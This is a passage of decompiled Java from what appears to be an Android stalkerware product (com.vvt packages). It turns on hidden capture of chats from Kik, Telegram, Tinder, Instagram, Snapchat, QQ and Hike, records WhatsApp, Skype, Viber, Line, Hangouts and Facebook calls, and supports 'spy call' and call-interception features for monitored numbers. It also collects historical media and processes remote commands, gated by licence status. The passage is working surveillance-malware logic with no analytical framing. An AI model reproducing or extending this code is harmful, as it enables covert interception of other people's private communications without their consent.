          t(bool2, bool1, paramh, localb);
          if (!bool6) {
            continue;
          }
          localObject1 = "213";
          bool1 = ((List)localObject4).contains(localObject1);
          if (!bool1) {
            continue;
          }
          bool1 = true;
          if ((!bool5) || (!bool1)) {
            continue;
          }
          bool1 = paramPrefIMCaptureSettings.isKikMessengerCaptureEnabled();
          if (!bool1) {
            continue;
          }
          bool1 = true;
          bool3 = a;
          if (bool3) {}
          d(bool2, bool1, paramh, localb);
          if (!bool6) {
            continue;
          }
          localObject1 = "214";
          bool1 = ((List)localObject4).contains(localObject1);
          if (!bool1) {
            continue;
          }
          bool1 = true;
          if ((!bool5) || (!bool1)) {
            continue;
          }
          bool1 = paramPrefIMCaptureSettings.isTelegramCaptureEnabled();
          if (!bool1) {
            continue;
          }
          bool1 = true;
          bool3 = a;
          if (bool3) {}
          c(bool2, bool1, paramh, localb);
          if (!bool6) {
            continue;
          }
          localObject1 = "215";
          bool1 = ((List)localObject4).contains(localObject1);
          if (!bool1) {
            continue;
          }
          bool1 = true;
          if ((!bool5) || (!bool1)) {
            continue;
          }
          bool1 = paramPrefIMCaptureSettings.isTinderCaptureEnabled();
          if (!bool1) {
            continue;
          }
          bool1 = true;
          bool3 = bool1;
          bool1 = a;
          if (bool1) {}
          e(bool2, bool3, paramh, localb);
          if (!bool6) {
            continue;
          }
          localObject1 = "217";
          bool1 = ((List)localObject4).contains(localObject1);
          if (!bool1) {
            continue;
          }
          bool1 = true;
          if ((!bool5) || (!bool1)) {
            continue;
          }
          bool1 = paramPrefIMCaptureSettings.isInstagramCaptureEnabled();
          if (!bool1) {
            continue;
          }
          bool1 = true;
          boolean bool7 = a;
          if (bool7) {}
          g(bool2, bool1, paramh, localb);
          if (!bool6) {
            continue;
          }
          localObject1 = "210";
          bool1 = ((List)localObject4).contains(localObject1);
          if (!bool1) {
            continue;
          }
          bool1 = true;
          if ((!bool5) || (!bool1)) {
            continue;
          }
          bool1 = paramPrefIMCaptureSettings.isSnapchatCaptureEnabled();
          if (!bool1) {
            continue;
          }
          bool1 = true;
          bool7 = a;
          if (bool7) {}
          a(bool2, bool1, paramh, localb);
          if (!bool6) {
            continue;
          }
          localObject1 = "216";
          bool1 = ((List)localObject4).contains(localObject1);
          if (!bool1) {
            continue;
          }
          bool1 = true;
          if ((bool5) && (bool1))
          {
            bool1 = paramPrefIMCaptureSettings.isQQCaptureEnabled();
            if (!bool1) {}
          }
          bool1 = a;
          if (bool1) {}
          b(bool2, bool3, paramh, localb);
          if (!bool6) {
            continue;
          }
          localObject1 = "218";
          bool1 = ((List)localObject4).contains(localObject1);
          if (!bool1) {
            continue;
          }
          bool1 = true;
          if ((!bool5) || (!bool1)) {
            continue;
          }
          bool1 = paramPrefIMCaptureSettings.isHikeCaptureEnabled();
          if (!bool1) {
            continue;
          }
          bool1 = true;
          bool3 = a;
          if (bool3) {}
          f(bool2, bool1, paramh, localb);
          bool1 = a;
          if (bool1) {}
          return;
        }
        bool1 = false;
        localObject1 = null;
        boolean bool2 = false;
        continue;
        bool1 = false;
        localObject1 = null;
        boolean bool5 = false;
        continue;
        bool1 = false;
        localObject1 = null;
        continue;
        bool1 = false;
        localObject1 = null;
        continue;
        bool1 = false;
        localObject1 = null;
        continue;
        bool1 = false;
        localObject1 = null;
        continue;
        bool1 = false;
        localObject1 = null;
        continue;
        bool1 = false;
        localObject1 = null;
        continue;
        bool1 = false;
        localObject1 = null;
        continue;
        bool1 = false;
        localObject1 = null;
        continue;
        bool1 = false;
        localObject1 = null;
        continue;
        bool1 = false;
        localObject1 = null;
        continue;
        bool1 = false;
        localObject1 = null;
        continue;
        bool1 = false;
        localObject1 = null;
        continue;
        bool1 = false;
        localObject1 = null;
        continue;
        bool1 = false;
        localObject1 = null;
        continue;
        bool1 = false;
        localObject1 = null;
        continue;
        bool1 = false;
        localObject1 = null;
        continue;
        bool1 = false;
        localObject1 = null;
        continue;
        bool1 = false;
        localObject1 = null;
        continue;
        bool1 = false;
        localObject1 = null;
        continue;
        bool1 = false;
        localObject1 = null;
        continue;
        bool1 = false;
        localObject1 = null;
        continue;
        bool1 = false;
        localObject1 = null;
        boolean bool3 = false;
        localObject3 = null;
        continue;
        bool1 = false;
        localObject1 = null;
        continue;
        bool1 = false;
        localObject1 = null;
        continue;
        bool1 = false;
        localObject1 = null;
        continue;
        bool1 = false;
        localObject1 = null;
        continue;
        bool1 = false;
        localObject1 = null;
        continue;
        bool1 = false;
        localObject1 = null;
        continue;
        bool1 = false;
        localObject1 = null;
      }
      label1715:
      boolean bool4 = false;
      Object localObject4 = null;
    }
  }
  
  public static void a(AppEngine1 paramh, List paramList, boolean paramBoolean, PrefEventsCapture paramPrefEventsCapture, PrefVoipCallRecordingCaptureSettings paramPrefVoipCallRecordingCaptureSettings, Map paramMap)
  {
    for (;;)
    {
      boolean bool2;
      Object localObject3;
      synchronized (i.class)
      {
        bool1 = a;
        if (bool1) {}
        Object localObject1 = FeatureId.CAPTURE_VOIP_CALL_RECORDING;
        bool1 = paramList.contains(localObject1);
        bool2 = a;
        if (bool2) {}
        bool2 = a;
        if (bool2) {}
        localObject3 = paramh.d();
        RunningMode localRunningMode = RunningMode.LIMITED_1;
        if (localObject3 != localRunningMode)
        {
          localObject3 = paramh.d();
          localRunningMode = RunningMode.FULL;
          if (localObject3 != localRunningMode) {}
        }
        else if (bool1)
        {
          bool1 = true;
          bool3 = bool1;
          bool1 = paramPrefEventsCapture.isCaptureEnabled();
          bool2 = a;
          if (bool2) {}
          localObject3 = FeatureId.CAPTURE_VOIP_CALL_RECORDING;
          bool2 = paramPrefEventsCapture.isCapture((FeatureId)localObject3);
          boolean bool4 = a;
          if ((bool4) && ((!paramBoolean) || (!bool1) || (!bool2))) {
            continue;
          }
          bool1 = true;
          bool5 = bool1;
          bool1 = a;
          if (bool1) {}
          localObject1 = "92";
          bool4 = paramMap.containsKey(localObject1);
          bool1 = false;
          localObject1 = null;
          if (!bool4) {
            break label1103;
          }
          localObject1 = "92";
          localObject1 = paramMap.get(localObject1);
          localObject1 = (List)localObject1;
          localObject3 = localObject1;
          if (!bool4) {
            continue;
          }
          localObject1 = "401";
          bool1 = ((List)localObject3).contains(localObject1);
          if (!bool1) {
            continue;
          }
          bool1 = true;
          if ((!bool5) || (!bool1)) {
            continue;
          }
          bool1 = paramPrefVoipCallRecordingCaptureSettings.isFacebookVoipCallRecordingCaptureEnabled();
          if (!bool1) {
            continue;
          }
          bool1 = true;
          bool6 = bool1;
          bool1 = a;
          if ((bool1) && (!bool4)) {
            continue;
          }
          localObject1 = "404";
          bool1 = ((List)localObject3).contains(localObject1);
          if (!bool1) {
            continue;
          }
          bool1 = true;
          if ((!bool5) || (!bool1)) {
            continue;
          }
          bool1 = paramPrefVoipCallRecordingCaptureSettings.isLineVoipCallRecordingCaptureEnabled();
          if (!bool1) {
            continue;
          }
          bool1 = true;
          bool7 = bool1;
          bool1 = a;
          if ((bool1) && (!bool4)) {
            continue;
          }
          localObject1 = "402";
          bool1 = ((List)localObject3).contains(localObject1);
          if (!bool1) {
            continue;
          }
          bool1 = true;
          if ((!bool5) || (!bool1)) {
            continue;
          }
          bool1 = paramPrefVoipCallRecordingCaptureSettings.isViberVoipCallRecordingCaptureEnabled();
          if (!bool1) {
            continue;
          }
          bool1 = true;
          bool8 = bool1;
          bool1 = a;
          if ((bool1) && (!bool4)) {
            continue;
          }
          localObject1 = "403";
          bool1 = ((List)localObject3).contains(localObject1);
          if (!bool1) {
            continue;
          }
          bool1 = true;
          if ((!bool5) || (!bool1)) {
            continue;
          }
          bool1 = paramPrefVoipCallRecordingCaptureSettings.isWhatsAppVoipCallRecordingCaptureEnabled();
          if (!bool1) {
            continue;
          }
          bool1 = true;
          bool9 = bool1;
          bool1 = a;
          if ((bool1) && (!bool4)) {
            continue;
          }
          localObject1 = "410";
          bool1 = ((List)localObject3).contains(localObject1);
          if (!bool1) {
            continue;
          }
          bool1 = true;
          if ((!bool5) || (!bool1)) {
            continue;
          }
          bool1 = paramPrefVoipCallRecordingCaptureSettings.isHangoutVoipCallRecordingCaptureEnabled();
          if (!bool1) {
            continue;
          }
          bool1 = true;
          bool10 = bool1;
          bool1 = a;
          if ((bool1) && (!bool4)) {
            continue;
          }
          localObject1 = "400";
          bool1 = ((List)localObject3).contains(localObject1);
          if (!bool1) {
            continue;
          }
          bool1 = true;
          if ((!bool5) || (!bool1)) {
            continue;
          }
          bool1 = paramPrefVoipCallRecordingCaptureSettings.isSkypeVoipCallRecordingCaptureEnabled();
          if (!bool1) {
            continue;
          }
          bool1 = true;
          bool11 = bool1;
          bool1 = a;
          if ((bool1) && (!bool3)) {
            break label1067;
          }
          localObject1 = paramh.aj;
          if (localObject1 == null)
          {
            localObject1 = new com/vvt/al/d;
            localObject3 = paramh.b();
            localRunningMode = paramh.d();
            Context localContext = paramh.a();
            q localq = paramh.h;
            String str = paramh.c();
            com.vvt.n.a.c localc = paramh.V;
            ((com.vvt.al.d)localObject1).<init>((String)localObject3, localRunningMode, localContext, localq, str, localc);
            paramh.aj = ((com.vvt.al.d)localObject1);
          }
          if (!bool5) {
            break label1043;
          }
          bool1 = a;
          if (bool1) {}
          localObject1 = paramh.aj;
          ((com.vvt.al.d)localObject1).e(bool6);
          localObject1 = paramh.aj;
          ((com.vvt.al.d)localObject1).d(bool10);
          localObject1 = paramh.aj;
          ((com.vvt.al.d)localObject1).a(bool7);
          localObject1 = paramh.aj;
          ((com.vvt.al.d)localObject1).f(bool11);
          localObject1 = paramh.aj;
          ((com.vvt.al.d)localObject1).b(bool8);
          localObject1 = paramh.aj;
          ((com.vvt.al.d)localObject1).c(bool9);
          localObject1 = paramh.aj;
          bool1 = ((com.vvt.al.d)localObject1).c();
          if (bool1) {
            continue;
          }
          bool1 = a;
          if (bool1) {}
          localObject1 = paramh.aj;
          ((com.vvt.al.d)localObject1).d();
          bool1 = a;
          if (bool1) {}
          return;
        }
        bool1 = false;
        localObject1 = null;
        boolean bool3 = false;
        localRunningMode = null;
        continue;
        bool1 = false;
        localObject1 = null;
        boolean bool5 = false;
        continue;
        bool1 = false;
        localObject1 = null;
        continue;
        bool1 = false;
        localObject1 = null;
        boolean bool6 = false;
        continue;
        bool1 = false;
        localObject1 = null;
        continue;
        bool1 = false;
        localObject1 = null;
        boolean bool7 = false;
        continue;
        bool1 = false;
        localObject1 = null;
        continue;
        bool1 = false;
        localObject1 = null;
        boolean bool8 = false;
        continue;
        bool1 = false;
        localObject1 = null;
        continue;
        bool1 = false;
        localObject1 = null;
        boolean bool9 = false;
        continue;
        bool1 = false;
        localObject1 = null;
        continue;
        bool1 = false;
        localObject1 = null;
        boolean bool10 = false;
        continue;
        bool1 = false;
        localObject1 = null;
        continue;
        bool1 = false;
        localObject1 = null;
        boolean bool11 = false;
        continue;
        bool1 = a;
        if (bool1) {}
        localObject1 = paramh.aj;
        ((com.vvt.al.d)localObject1).e();
      }
      label1043:
      boolean bool1 = a;
      if (bool1) {}
      com.vvt.al.d locald = paramh.aj;
      locald.f();
      continue;
      label1067:
      locald = paramh.aj;
      if (locald != null)
      {
        locald = paramh.aj;
        locald.f();
        bool1 = false;
        locald = null;
        paramh.aj = null;
        continue;
        label1103:
        bool2 = false;
        localObject3 = null;
      }
    }
  }
  
  public static void a(AppEngine1 paramh, List paramList, boolean paramBoolean, PrefEventsCapture paramPrefEventsCapture, Map paramMap)
  {
    boolean bool1 = true;
    synchronized (i.class)
    {
      boolean bool2 = a;
      if (bool2) {}
      com.vvt.base.b localb = com.vvt.base.b.a();
      Object localObject1 = FeatureId.CAPTURE_VOIP_CALLLOG;
      bool2 = paramList.contains(localObject1);
      Object localObject3 = paramh.d();
      RunningMode localRunningMode = RunningMode.LIMITED_1;
      boolean bool3;
      boolean bool4;
      boolean bool5;
      if (localObject3 != localRunningMode)
      {
        localObject3 = paramh.d();
        localRunningMode = RunningMode.FULL;
        if (localObject3 != localRunningMode) {}
      }
      else if (bool2)
      {
        bool3 = bool1;
        bool2 = paramPrefEventsCapture.isCaptureEnabled();
        bool4 = a;
        if (bool4) {}
        localObject3 = FeatureId.CAPTURE_VOIP_CALLLOG;
        bool4 = paramPrefEventsCapture.isCapture((FeatureId)localObject3);
        bool5 = a;
        if ((bool5) && ((!paramBoolean) || (!bool2) || (!bool4))) {
          break label329;
        }
        bool4 = bool1;
        label142:
        bool2 = a;
        if (bool2) {}
        localObject1 = "92";
        bool5 = paramMap.containsKey(localObject1);
        bool2 = false;
        localObject1 = null;
        if (bool5)
        {
          localObject1 = "92";
          localObject1 = paramMap.get(localObject1);
          localObject1 = (List)localObject1;
        }
        if (!bool5) {
          break label338;
        }
        String str = "20";
        bool2 = ((List)localObject1).contains(str);
        if (!bool2) {
          break label338;
        }
        bool2 = bool1;
      }
      for (;;)
      {
        bool5 = a;
        if ((bool5) && ((!bool4) || (!bool2))) {
          break label347;
        }
        bool2 = bool1;
        bool1 = a;
        if (bool1) {}
        p(bool3, bool2, paramh, localb);
        o(bool3, bool2, paramh, localb);
        j(bool3, bool2, paramh, localb);
        r(bool3, bool2, paramh, localb);
        m(bool3, bool2, paramh, localb);
        return;
        bool3 = false;
        localRunningMode = null;
        break;
        label329:
        bool4 = false;
        localObject3 = null;
        break label142;
        label338:
        bool2 = false;
        localObject1 = null;
      }
      label347:
      bool2 = false;
      localObject1 = null;
    }
  }
  
  public static void a(FeatureId paramFeatureId, AppEngine1 paramh, List paramList, boolean paramBoolean)
  {
    boolean bool1 = a;
    if (bool1) {}
    int[] arrayOfInt = k.a;
    int j = paramFeatureId.ordinal();
    int i = arrayOfInt[j];
    switch (i)
    {
    }
    for (;;)
    {
      boolean bool2 = a;
      if (bool2) {}
      return;
      b(paramh, paramList, paramBoolean);
      continue;
      f(paramh, paramList, paramBoolean);
    }
  }
  
  private static void a(boolean paramBoolean1, boolean paramBoolean2, AppEngine1 paramh, com.vvt.base.b paramb)
  {
    boolean bool = a;
    com.vvt.capture.snapchat.a locala;
    if ((!bool) || (paramBoolean1))
    {
      locala = paramh.ag;
      if (locala == null)
      {
        locala = new com/vvt/capture/snapchat/a;
        String str = paramh.b();
        q localq = paramh.h;
        RunningMode localRunningMode = paramh.d();
        com.vvt.n.a.c localc = paramh.V;
        Context localContext = paramh.a();
        locala.<init>(str, localq, localRunningMode, localc, localContext, paramb);
        paramh.ag = locala;
      }
      if (paramBoolean2)
      {
        paramh.ag.a(paramb);
        locala = paramh.ag;
        bool = locala.k();
        if (!bool)
        {
          bool = a;
          if (bool) {}
          locala = paramh.ag;
          locala.g();
        }
      }
    }
    for (;;)
    {
      bool = a;
      if (bool) {}
      return;
      bool = a;
      if (bool) {}
      locala = paramh.ag;
      locala.h();
      continue;
      locala = paramh.ag;
      if (locala != null)
      {
        paramh.ag.h();
        paramh.ag.j();
        bool = false;
        locala = null;
        paramh.ag = null;
      }
    }
  }
  
  public static com.vvt.configurationmanager.c b(AppEngine1 paramh)
  {
    com.vvt.license.b localb = paramh.k;
    Object localObject = localb.a();
    int i = ((LicenseInfo)localObject).getConfigurationId();
    LicenseStatus localLicenseStatus1 = ((LicenseInfo)localObject).getLicenseStatus();
    LicenseStatus localLicenseStatus2 = LicenseStatus.NOT_ACTIVATED;
    if (localLicenseStatus1 == localLicenseStatus2) {
      i = -1;
    }
    for (;;)
    {
      return paramh.e.a(i);
      localLicenseStatus1 = ((LicenseInfo)localObject).getLicenseStatus();
      localLicenseStatus2 = LicenseStatus.EXPIRED;
      if (localLicenseStatus1 == localLicenseStatus2)
      {
        i = -2;
      }
      else
      {
        localObject = ((LicenseInfo)localObject).getLicenseStatus();
        localLicenseStatus1 = LicenseStatus.DISABLED;
        if (localObject == localLicenseStatus1) {
          i = -3;
        }
      }
    }
  }
  
  public static void b(AppEngine1 paramh, List paramList, boolean paramBoolean)
  {
    boolean bool1 = true;
    for (;;)
    {
      boolean bool2;
      Object localObject4;
      Object localObject5;
      int j;
      synchronized (i.class)
      {
        bool2 = a;
        if (bool2) {}
        Object localObject1 = FeatureId.SPY_CALL;
        boolean bool4 = paramList.contains(localObject1);
        localObject1 = FeatureId.CALL_INTERCEPT;
        boolean bool5 = paramList.contains(localObject1);
        bool2 = a;
        if (bool2) {}
        localObject1 = paramh.d();
        localObject4 = RunningMode.FULL;
        if ((localObject1 == localObject4) && ((bool4) || (bool5)))
        {
          localObject1 = FeatureId.MONITOR_NUMBER;
          bool2 = paramList.contains(localObject1);
          if (bool2)
          {
            bool2 = bool1;
            localObject4 = FeatureId.MONITOR_NUMBER;
            boolean bool6 = paramList.contains(localObject4);
            localObject5 = paramh.n;
            if ((!bool2) || (localObject5 == null)) {
              break label467;
            }
            localObject1 = FxPreferenceType.SPY_CALL;
            localObject1 = ((com.vvt.preference.b)localObject5).a((FxPreferenceType)localObject1);
            localObject1 = (PrefSpyCall)localObject1;
            localObject4 = FxPreferenceType.MONITOR_NUMBER;
            localObject4 = ((com.vvt.preference.b)localObject5).a((FxPreferenceType)localObject4);
            localObject4 = (PrefMonitorNumber)localObject4;
            localObject5 = ((PrefMonitorNumber)localObject4).getList();
            bool6 = a;
            if ((bool6) && (localObject5 != null)) {
              continue;
            }
            bool6 = false;
            localObject4 = null;
            if ((!paramBoolean) || (!bool6)) {
              continue;
            }
            bool6 = ((PrefSpyCall)localObject1).isSpyCallEnabled();
            if (!bool6)
            {
              bool2 = ((PrefSpyCall)localObject1).isCallInterceptEnabled();
              if (!bool2) {
                continue;
              }
            }
            bool2 = a;
            if ((bool2) && (!bool1)) {
              continue;
            }
            localObject1 = paramh.b;
            if (localObject1 != null)
            {
              localObject1 = paramh.b;
              ((com.vvt.callmanager.ref.e)localObject1).b((List)localObject5);
              localObject1 = paramh.b;
              ((com.vvt.callmanager.ref.e)localObject1).a((List)localObject5);
              bool2 = a;
              if (bool2) {}
              localObject1 = paramh.b;
              ((com.vvt.callmanager.ref.e)localObject1).a(bool4, bool5);
            }
            bool2 = a;
            if (bool2) {}
            localObject1 = paramh.b;
            if (localObject1 != null)
            {
              localObject1 = paramh.b;
              ((com.vvt.callmanager.ref.e)localObject1).a(bool1);
            }
            bool2 = a;
            if (bool2) {}
            return;
          }
        }
        bool2 = false;
        localObject1 = null;
        continue;
        j = ((List)localObject5).size();
        continue;
        bool1 = false;
        continue;
        bool2 = a;
        if (bool2) {}
        localObject1 = paramh.b;
        if (localObject1 == null) {
          continue;
        }
        localObject1 = paramh.b;
        localObject4 = new java/util/ArrayList;
        ((ArrayList)localObject4).<init>();
        ((com.vvt.callmanager.ref.e)localObject1).b((List)localObject4);
        localObject1 = paramh.b;
        j = 0;
        localObject4 = null;
        ((com.vvt.callmanager.ref.e)localObject1).a(false, false);
      }
      label467:
      if ((j != 0) && (localObject5 != null))
      {
        localObject3 = FxPreferenceType.MONITOR_NUMBER;
        localObject3 = ((com.vvt.preference.b)localObject5).a((FxPreferenceType)localObject3);
        localObject3 = (PrefMonitorNumber)localObject3;
        localObject4 = ((PrefMonitorNumber)localObject3).getList();
        bool2 = a;
        if ((!bool2) || (localObject4 == null))
        {
          bool2 = false;
          localObject3 = null;
          label526:
          if ((!paramBoolean) || (!bool2)) {
            break label665;
          }
          bool2 = bool1;
          label538:
          if (!bool2) {
            break label674;
          }
          localObject3 = paramh.b;
          if (localObject3 != null)
          {
            localObject3 = paramh.b;
            ((com.vvt.callmanager.ref.e)localObject3).b((List)localObject4);
            localObject3 = paramh.b;
            ((com.vvt.callmanager.ref.e)localObject3).a((List)localObject4);
            bool2 = a;
            if (bool2) {}
            localObject3 = paramh.b;
            j = 0;
            localObject4 = null;
            bool1 = false;
            ((com.vvt.callmanager.ref.e)localObject3).a(false, false);
          }
        }
        for (;;)
        {
          bool2 = a;
          if (bool2) {}
          localObject3 = paramh.b;
          if (localObject3 == null) {
            break;
          }
          localObject3 = paramh.b;
          j = 0;
          localObject4 = null;
          ((com.vvt.callmanager.ref.e)localObject3).a(false);
          break;
          int i = ((List)localObject4).size();
          break label526;
          label665:
          i = 0;
          localObject3 = null;
          break label538;
          label674:
          localObject3 = paramh.b;
          if (localObject3 != null)
          {
            bool3 = a;
            if (bool3) {}
            localObject3 = paramh.b;
            localObject4 = new java/util/ArrayList;
            ((ArrayList)localObject4).<init>();
            ((com.vvt.callmanager.ref.e)localObject3).b((List)localObject4);
            localObject3 = paramh.b;
            j = 0;
            localObject4 = null;
            bool1 = false;
            ((com.vvt.callmanager.ref.e)localObject3).a(false, false);
          }
        }
      }
      boolean bool3 = a;
      if ((!bool3) || (localObject5 != null)) {}
      Object localObject3 = paramh.b;
      if (localObject3 != null)
      {
        bool3 = a;
        if (bool3) {}
        localObject3 = paramh.b;
        localObject4 = new java/util/ArrayList;
        ((ArrayList)localObject4).<init>();
        ((com.vvt.callmanager.ref.e)localObject3).b((List)localObject4);
        localObject3 = paramh.b;
        j = 0;
        localObject4 = null;
        bool1 = false;
        ((com.vvt.callmanager.ref.e)localObject3).a(false, false);
        bool3 = a;
        if (bool3) {}
        localObject3 = paramh.b;
        j = 0;
        localObject4 = null;
        ((com.vvt.callmanager.ref.e)localObject3).a(false);
      }
    }
  }
  
  public static void b(AppEngine1 paramh, List paramList, boolean paramBoolean, PrefEventsCapture paramPrefEventsCapture)
  {
    boolean bool1 = true;
    boolean bool2 = false;
    synchronized (i.class)
    {
      q localq = paramh.h;
      FeatureId localFeatureId = FeatureId.CAPTURE_SYSTEM;
      boolean bool3 = paramList.contains(localFeatureId);
      if (bool3)
      {
        i = paramPrefEventsCapture.getTriggerNumber();
        j = paramPrefEventsCapture.getDeliverTimer();
        bool3 = a;
        if ((!bool3) || (paramBoolean))
        {
          bool3 = paramPrefEventsCapture.isDeliverEnabled();
          if (bool3)
          {
            bool4 = bool1;
            bool3 = localq.c();
            if (bool3 == bool4) {
              break label178;
            }
            bool3 = bool1;
            k = localq.d();
            if (k == j) {
              break label187;
            }
            bool2 = a;
            if (bool2) {}
            localq.a(i);
            localq.a(bool4);
            localq.b(j);
            if ((bool3) || (bool1))
            {
              bool1 = a;
              if (bool1) {}
              localq.a();
            }
          }
        }
      }
      label178:
      label187:
      while (localq == null) {
        for (;;)
        {
          int i;
          int j;
          int k;
          return;
          boolean bool4 = false;
          continue;
          bool3 = false;
          localFeatureId = null;
          continue;
          bool1 = false;
          Object localObject1 = null;
        }
      }
      bool1 = a;
      if (bool1) {}
      localq.b();
    }
  }
  
  private static void b(boolean paramBoolean1, boolean paramBoolean2, AppEngine1 paramh, com.vvt.base.b paramb)
  {
    boolean bool = a;
    com.vvt.capture.qq.b localb;
    if ((!bool) || (paramBoolean1))
    {
      localb = paramh.ah;
      if (localb == null)
      {
        localb = new com/vvt/capture/qq/b;
        String str = paramh.b();
        q localq = paramh.h;
        RunningMode localRunningMode = paramh.d();
        com.vvt.n.a.c localc = paramh.V;
        Context localContext = paramh.a();
        localb.<init>(str, localq, localRunningMode, localc, localContext, paramb);
        paramh.ah = localb;
      }
      if (paramBoolean2)
      {
        paramh.ah.a(paramb);
        localb = paramh.ah;
        bool = localb.k();
        if (!bool)
        {
          bool = a;
          if (bool) {}
          localb = paramh.ah;
          localb.g();
        }
      }
    }
    for (;;)
    {
      bool = a;
      if (bool) {}
      return;
      bool = a;
      if (bool) {}
      localb = paramh.ah;
      localb.h();
      continue;
      localb = paramh.ah;
      if (localb != null)
      {
        paramh.ah.h();
        paramh.ah.j();
        bool = false;
        localb = null;
        paramh.ah = null;
      }
    }
  }
  
  public static void c(AppEngine1 paramh)
  {
    bool1 = a;
    if (bool1) {}
    for (;;)
    {
      try
      {
        localObject1 = b(paramh);
        localObject1 = ((com.vvt.configurationmanager.c)localObject1).b();
        com.vvt.license.b localb = paramh.k;
        ProductInfoImpl localProductInfoImpl = paramh.o;
        Object localObject2 = paramh.l;
        localObject2 = ((com.vvt.phoneinfo.b)localObject2).d();
        bool2 = localb.a(localProductInfoImpl, (String)localObject2);
        boolean bool3 = a;
        if (!bool3) {}
      }
      catch (Exception localException)
      {
        Object localObject1;
        boolean bool2;
        bool1 = c;
        if (!bool1) {
          continue;
        }
        continue;
      }
      try
      {
        b(paramh, (List)localObject1, bool2);
        localObject1 = paramh.b;
        if (localObject1 != null)
        {
          localObject1 = paramh.b;
          ((com.vvt.callmanager.ref.e)localObject1).b();
        }
      }
      catch (FxPreferenceException localFxPreferenceException)
      {
        bool1 = c;
        if (!bool1) {
          continue;
        }
      }
      catch (BugEngineException localBugEngineException)
      {
        bool1 = c;
        if (!bool1) {
          continue;
        }
      }
    }
    bool1 = a;
    if (bool1) {}
  }
  
  public static void c(AppEngine1 paramh, List paramList, boolean paramBoolean)
  {
    synchronized (i.class)
    {
      boolean bool1 = a;
      if (bool1) {}
      Object localObject1 = FeatureId.CALL_WATCH_NOTIFICATION;
      bool1 = paramList.contains(localObject1);
      if (!bool1)
      {
        localObject1 = FeatureId.CAPTURE_CALL_RECORDING;
        bool1 = paramList.contains(localObject1);
        if (!bool1) {}
      }
      else
      {
        localObject1 = paramh.b;
        if (localObject1 != null)
        {
          localObject1 = paramh.b;
          boolean bool2 = true;
          ((com.vvt.callmanager.ref.e)localObject1).b(bool2);
        }
      }
      do
      {
        bool1 = a;
        if (bool1) {}
        return;
        bool1 = a;
      } while (!bool1);
    }
  }
  
  public static void c(AppEngine1 paramh, List paramList, boolean paramBoolean, PrefEventsCapture paramPrefEventsCapture)
  {
    boolean bool = a;
    if (bool) {}
    bool = paramPrefEventsCapture.isCaptureEnabled();
    com.vvt.n.a.c localc;
    if ((paramBoolean) && (bool))
    {
      bool = true;
      RunningMode localRunningMode1 = paramh.d();
      RunningMode localRunningMode2 = RunningMode.LIMITED_1;
      if (localRunningMode1 != localRunningMode2) {
        break label116;
      }
      if (!bool) {
        break label92;
      }
      localc = paramh.V;
      localc.a();
      bool = a;
      if (!bool) {}
    }
    for (;;)
    {
      bool = a;
      if (bool) {}
      return;
      bool = false;
      localc = null;
      break;
      label92:
      bool = a;
      if (bool) {}
      localc = paramh.V;
      localc.b();
      continue;
      label116:
      bool = a;
      if (!bool) {}
    }
  }
  
  private static void c(boolean paramBoolean1, boolean paramBoolean2, AppEngine1 paramh, com.vvt.base.b paramb)
  {
    boolean bool = a;
    com.vvt.capture.telegram.a locala;
    if ((!bool) || (paramBoolean1))
    {
      locala = paramh.ad;
      if (locala == null)
      {
        locala = new com/vvt/capture/telegram/a;
        String str = paramh.b();
        q localq = paramh.h;
        RunningMode localRunningMode = paramh.d();
        com.vvt.n.a.c localc = paramh.V;
        Context localContext = paramh.a();
        locala.<init>(str, localq, localRunningMode, localc, localContext, paramb);
        paramh.ad = locala;
      }
      if (paramBoolean2)
      {
        paramh.ad.a(paramb);
        locala = paramh.ad;
        bool = locala.k();
        if (!bool)
        {
          bool = a;
          if (bool) {}
          locala = paramh.ad;
          locala.g();
        }
      }
    }
    for (;;)
    {
      bool = a;
      if (bool) {}
      return;
      bool = a;
      if (bool) {}
      locala = paramh.ad;
      locala.h();
      continue;
      locala = paramh.ad;
      if (locala != null)
      {
        paramh.ad.h();
        paramh.ad.j();
        bool = false;
        locala = null;
        paramh.ad = null;
      }
    }
  }
  
  private static void d(AppEngine1 paramh)
  {
    Object localObject1 = paramh.k.a();
    boolean bool = b;
    if (bool) {}
    bool = a;
    if (bool) {}
    Object localObject2 = paramh.p;
    localObject1 = ((LicenseInfo)localObject1).getActivationCode();
    ((com.vvt.remotecommand.b)localObject2).a((String)localObject1);
    localObject1 = paramh.p;
    localObject2 = paramh.k;
    ((com.vvt.remotecommand.b)localObject1).a((com.vvt.license.a)localObject2);
    localObject1 = paramh.p;
    localObject2 = paramh.c;
    ((com.vvt.remotecommand.b)localObject1).a((com.vvt.ae.f)localObject2);
    localObject1 = b(paramh);
    bool = a;
    if (bool) {}
    localObject2 = paramh.p;
    Map localMap = ((com.vvt.configurationmanager.c)localObject1).c();
    ((com.vvt.remotecommand.b)localObject2).a(localMap);
    bool = a;
    if (bool) {}
    localObject2 = paramh.p;
    localObject1 = ((com.vvt.configurationmanager.c)localObject1).b();
    ((com.vvt.remotecommand.b)localObject2).a((List)localObject1);
  }
  
  public static void d(AppEngine1 paramh, List paramList, boolean paramBoolean)
  {
    int i = 1;
    synchronized (i.class)
    {
      Object localObject1 = FeatureId.CAPTURE_HISTORICAL_MEDIA;
      boolean bool1 = paramList.contains(localObject1);
      Object localObject3;
      Object localObject4;
      boolean bool4;
      if (bool1)
      {
        localObject1 = paramh.q;
        localObject3 = RemoteFunction.REQUEST_MEDIA_HISTORICAL;
        ((RemoteControlImpl)localObject1).registerFunction((RemoteFunction)localObject3);
        localObject1 = paramh.H;
        if (localObject1 == null)
        {
          localObject1 = new com/vvt/v/c;
          localObject3 = paramh.b();
          localObject4 = paramh.a();
          localObject4 = ((Context)localObject4).getContentResolver();
          q localq = paramh.h;
          RunningMode localRunningMode = paramh.d();
          ((com.vvt.v.c)localObject1).<init>((String)localObject3, (ContentResolver)localObject4, localq, localRunningMode);
          paramh.H = ((com.vvt.v.c)localObject1);
        }
        localObject1 = paramh.n;
        localObject3 = FxPreferenceType.MEDIA_HISTORICAL;
        localObject1 = ((com.vvt.preference.b)localObject1).a((FxPreferenceType)localObject3);
        localObject1 = (PrefMediaHistorical)localObject1;
        int k = ((PrefMediaHistorical)localObject1).getMediaFlag();
        if ((paramBoolean) && (k > 0))
        {
          bool1 = i;
          boolean bool3 = a;
          if ((bool3) && (!bool1)) {
            break label294;
          }
          bool1 = a;
          if (bool1) {}
          bool1 = k & 0x1;
          if (i != bool1) {
            break label267;
          }
          bool4 = i;
          label199:
          int j = 2;
          int m = k & 0x2;
          if (j != m) {
            break label276;
          }
          m = i;
          label218:
          j = 4;
          k &= 0x4;
          if (j != k) {
            break label285;
          }
          j = i;
